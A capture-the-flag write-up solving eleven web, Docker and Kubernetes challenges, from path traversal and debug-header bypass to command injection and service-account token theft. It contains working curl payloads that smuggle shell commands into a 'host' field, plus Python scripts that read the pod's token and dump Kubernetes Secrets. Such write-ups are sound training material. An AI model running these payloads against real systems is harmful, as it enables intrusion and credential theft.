# Hamamooz ctf writeup by adrina :))

## Flag 1 — Docker Image Layers

### Vulnerability

The challenge exposed Docker-related information that could be inspected through the application environment.

The important observation was that sensitive data had been left behind in Docker image layers rather than being removed completely during the image build process.

Docker images are composed of multiple filesystem layers. Removing a file in a later layer does not necessarily remove the original contents from the earlier layer.

### Extraction

We inspected the Docker image metadata and its filesystem layers.

The interesting artifact was found in an older layer of the image. Although the file was no longer visible in the final container filesystem, its contents were still present in the underlying image layer.

This demonstrated why secrets must not be committed into an image and then deleted in a later Dockerfile instruction.

### PoC

A typical investigation can be performed with:

```bash
docker history --no-trunc <image>
docker inspect <image>
```

The image layers can then be inspected to identify files or commands that existed in previous layers.

The important attack chain was:

```text
Docker Image
    ↓
Image Layers
    ↓
Deleted/Hidden Artifact
    ↓
Sensitive Data
```



---

## Flag 2 — Docker Socket Access

### Vulnerability

The application environment exposed access to the Docker runtime through the Docker Unix socket.

The important resource was:

```text
/var/run/docker.sock
```

Access to the Docker socket is effectively access to the Docker daemon API. A process that can control the daemon may be able to create or manipulate containers with privileges beyond those of the original application.

### Extraction

We checked the runtime environment for the Docker socket.

Once the socket was found, Docker API access could be used to enumerate containers and inspect the runtime configuration.

The key discovery was that the Docker socket represented a much more powerful control interface than ordinary filesystem access.

### PoC

The socket can be checked with:

```bash
ls -l /var/run/docker.sock
```

and Docker access can be tested with:

```bash
docker ps
```

The resulting attack chain was:

```text
Compromised Application
        ↓
/var/run/docker.sock
        ↓
Docker API
        ↓
Container Control
```



---

## Flag 3 — Path Traversal

### Vulnerability

The report download endpoint accepted a user-controlled filename:

```text
/api/reports/download?file=
```

The supplied path was not sufficiently restricted to the intended reports directory.

This allowed directory traversal using:

```text
../
```

### Extraction

Normal report files could first be requested:

```text
report_1.txt
report_2.txt
```

The next step was to replace the filename with a traversal path.

The vulnerable endpoint accepted:

```text
../flag.txt
```

and returned the contents of the target file.

### PoC

```bash
curl -i \
  'https://ctf.seoeh.ir/api/reports/download?file=../flag.txt'
```

The server returned the flag file instead of restricting access to the reports directory.

The attack chain was:

```text
User-controlled filename
        ↓
../ traversal
        ↓
Filesystem outside reports directory
        ↓
flag.txt
```



---

## Flag 4 — Swagger / API Documentation Exposure

### Vulnerability

The application exposed API documentation through Swagger/OpenAPI.

Instead of requiring authentication or restricting the documentation to an internal environment, the API schema was publicly accessible.

This provided a useful map of the application's endpoints and parameters.

### Extraction

The Swagger/OpenAPI documentation was inspected to identify endpoints that were not immediately obvious from normal application usage.

The API definition exposed additional routes and their expected request formats.

This significantly reduced the amount of endpoint guessing required during reconnaissance.

### PoC

The Swagger/OpenAPI endpoint can be inspected through the application's API documentation route.

For example, after discovering the documentation endpoint, the schema can be requested with:

```bash
curl -i 'https://ctf.seoeh.ir/<swagger-or-openapi-endpoint>'
```

The resulting schema can then be searched for:

```text
paths
parameters
requestBody
security
```

This established the reconnaissance chain:

```text
Public API
    ↓
Swagger/OpenAPI
    ↓
Endpoint Enumeration
    ↓
Hidden Functionality
```



---

## Flag 5 — Debug Header / Flag Endpoint

### Vulnerability

The internal flag endpoint rejected ordinary external requests:

```text
/api/internal/flag
```

A normal request returned:

```text
403 Forbidden
```

However, the application trusted a client-controlled debug header.

The relevant header was:

```text
X-Debug-Mode: true
```

### Extraction

The endpoint was first requested normally:

```bash
curl -i \
  'https://ctf.seoeh.ir/api/internal/flag'
```

The server returned:

```json
{"error":"forbidden"}
```

The same endpoint was then requested with the debug header.

### PoC

```bash
curl -i \
  -H 'X-Debug-Mode: true' \
  'https://ctf.seoeh.ir/api/internal/flag'
```

The endpoint returned the flag.

The attack chain was:

```text
Internal Endpoint
        ↓
403 Forbidden
        ↓
Client-controlled Debug Header
        ↓
Authorization Bypass
        ↓
Flag Endpoint
```



---

## Flag 6 — IDOR / Tenant Data Leak

### Vulnerability

The application exposed resources belonging to different tenants through an identifier controlled by the client.

The authorization check did not correctly verify that the requested object belonged to the current tenant.

This resulted in an Insecure Direct Object Reference (IDOR).

### Extraction

We first accessed an object belonging to the current tenant.

The identifier was then modified to reference another tenant's object.

The application returned data belonging to the other tenant instead of rejecting the request.

The important observation was that object existence and object ownership were treated as separate concerns, but the ownership check was missing or insufficient.

### PoC

The general pattern was:

```bash
curl -i \
  'https://ctf.seoeh.ir/api/<resource>/<other-tenant-id>'
```

Changing the identifier caused the application to return data outside the current tenant.

The attack chain was:

```text
Authenticated Request
        ↓
User-controlled Object ID
        ↓
Missing Ownership Check
        ↓
Other Tenant
        ↓
Sensitive Data
```


---

## Flag 7 — Weak JWT Algorithm / Secret

### Vulnerability

The application used JSON Web Tokens for authentication, but the token verification configuration was insecure.

The challenge indicated that the JWT verification could be weakened through either an unsafe algorithm configuration or a weak signing secret.

JWT security depends on both the cryptographic algorithm and the server-side verification configuration.

### Extraction

We inspected the JWT structure and its header.

The token contained the standard JWT components:

```text
header.payload.signature
```

The header was inspected for its algorithm:

```text
alg
```

The signing configuration was then investigated to determine whether the application accepted an insecure algorithm or relied on a weak secret.

### PoC

A JWT can be decoded locally without validating the signature:

```python
import base64
import json

token = "<JWT>"

header = token.split(".")[0]

header += "=" * (-len(header) % 4)

print(
    json.dumps(
        json.loads(
            base64.urlsafe_b64decode(header)
        ),
        indent=2
    )
)
```

The important attack chain was:

```text
JWT
 ↓
Algorithm / Secret Analysis
 ↓
Weak Verification
 ↓
Authentication Bypass
```



---

## Flag 8 — Command Injection

### Vulnerability

The diagnostic endpoint:

```text
/api/diag/ping
```

accepted a user-controlled `host` parameter.

The value was passed to a system-level network diagnostic command without safe argument handling.

Shell metacharacters were therefore interpreted by the backend.

### Extraction

A normal request was first sent:

```bash
curl -s -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1"}'
```

The parameter was then tested with a command separator.

For example:

```bash
curl -s -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; id"}'
```

The backend interpreted the second command as part of the shell command.

### PoC

The command-execution primitive could then be used to inspect the backend environment.

For example:

```bash
curl -s -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

This returned the flag.

The complete attack chain was:

```text
External HTTP Request
        ↓
host parameter
        ↓
Unsafe command construction
        ↓
Shell metacharacter
        ↓
Arbitrary Command Execution
```


---

## Flag 9 — Privileged Pod + HostPath Escape

### Vulnerability

After obtaining Kubernetes API access, pod specifications were enumerated.

A particularly dangerous workload was found in:

```text
namespace: escape-zone
pod: legacy-worker
```

The pod used a host-root `hostPath` mount:

```yaml
hostPath:
  path: /
```

and mounted it inside the container as:

```text
/host
```

The container was also configured as:

```yaml
privileged: true
```

### Extraction

The pod specification was queried through the Kubernetes API.

The relevant configuration showed:

```text
hostPath: /
mountPath: /host
privileged: true
```

This meant that `/host` represented the filesystem of the Kubernetes node rather than an ordinary container directory.

The workload was running on:

```text
ctf-worker2
```

The combination of privileged execution and host-root access created a container-to-node escape primitive.

### PoC

The pod specification could be inspected with:

```python
import urllib.request
import ssl
import json

token = open(
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
).read().strip()

headers = {
    "Authorization": "Bearer " + token
}

url = (
    "https://kubernetes.default.svc"
    "/api/v1/namespaces/escape-zone"
    "/pods/legacy-worker"
)

request = urllib.request.Request(
    url,
    headers=headers
)

response = urllib.request.urlopen(
    request,
    context=ssl._create_unverified_context()
)

pod = json.load(response)

print(json.dumps(pod["spec"], indent=2))
```

The resulting attack chain was:

```text
Kubernetes API
        ↓
Pod Enumeration
        ↓
legacy-worker
        ↓
privileged: true
        ↓
hostPath: /
        ↓
/host
        ↓
Node Filesystem
```


---

## Flag 10 — SSRF into the Internal Kubernetes Network

### Vulnerability

The webhook testing endpoint accepted a user-controlled URL:

```text
/api/webhooks/test
```

The backend performed the HTTP request itself.

This created an SSRF primitive because the destination was controlled by the requester.

### Extraction

An external URL was first tested:

```bash
curl -i -X POST \
  'https://ctf.seoeh.ir/api/webhooks/test' \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://example.com","method":"GET"}'
```

The backend returned the response generated by the remote server.

The next step was to use the request from the backend's internal network context.

Kubernetes service discovery revealed:

```text
admin-panel.internal-tools.svc
```

The internal service exposed:

```text
port: 80
targetPort: 5000
```

### PoC

The internal service could be requested through the existing command-execution primitive:

```python
import urllib.request

url = "http://admin-panel.internal-tools.svc/"

response = urllib.request.urlopen(
    url,
    timeout=5
)

print("STATUS:", response.status)
print(response.read().decode())
```

The resulting chain was:

```text
External API
    ↓
SSRF / Command Execution
    ↓
Backend Container
    ↓
Kubernetes Internal Network
    ↓
admin-panel.internal-tools.svc
```



---

## Flag 11 — Kubernetes Service Account Token Leak

### Vulnerability

The compromised backend was running inside Kubernetes with a mounted service-account token.

The standard Kubernetes service-account directory was:

```text
/var/run/secrets/kubernetes.io/serviceaccount/
```

The token could be read from:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

The token provided authenticated access to the Kubernetes API according to the permissions assigned to the service account.

### Extraction

Using the command-execution primitive, we accessed the service-account token and queried the Kubernetes API.

The API was reachable through:

```text
https://kubernetes.default.svc
```

The `ctf-secrets` namespace contained a Secret named:

```text
flag-secret
```

The Secret contained a Base64-encoded `flag` value.

### PoC

The Secret was queried using the service-account token:

```python
import urllib.request
import ssl
import json
import base64

base = "/var/run/secrets/kubernetes.io/serviceaccount"

token = open(base + "/token").read().strip()

headers = {
    "Authorization": "Bearer " + token
}

url = (
    "https://kubernetes.default.svc"
    "/api/v1/namespaces/ctf-secrets"
    "/secrets/flag-secret"
)

request = urllib.request.Request(
    url,
    headers=headers
)

response = urllib.request.urlopen(
    request,
    context=ssl._create_unverified_context()
)

data = json.load(response)

for key, value in data.get("data", {}).items():
    print(
        key,
        "=",
        base64.b64decode(value).decode(
            errors="replace"
        )
    )
```

The returned Base64 value decoded to the final flag.

The complete chain was:

```text
Command Injection
        ↓
Service Account Token
        ↓
Kubernetes API
        ↓
ctf-secrets namespace
        ↓
flag-secret
        ↓
Base64 Decode
        ↓
flag



---

# Complete Attack Chain

The 11 findings can be viewed as several connected attack paths:

```text
Web/API Recon
    │
    ├── Swagger Exposure
    │
    ├── IDOR / Tenant Leak
    │
    ├── JWT Weakness
    │
    └── Debug Header Bypass
             │
             ↓
      Command Injection
             │
             ↓
    Kubernetes Service Account
             │
             ├── Kubernetes API
             │       │
             │       ├── Secret Discovery
             │       │
             │       ├── Service Discovery
             │       │
             │       └── Pod Enumeration
             │
             └── Internal Network
                     │
                     └── SSRF
                          │
                          ↓
                    admin-panel


Kubernetes API
      ↓
escape-zone/legacy-worker
      ↓
privileged: true
      ↓
hostPath: /
      ↓
/host
      ↓
Kind Node
      ↓
Container Runtime


Docker Investigation
      ↓
Image Layers
      ↓
Docker Socket
      ↓
Runtime Control


Report API
      ↓
Path Traversal
      ↓
../flag.txt
```

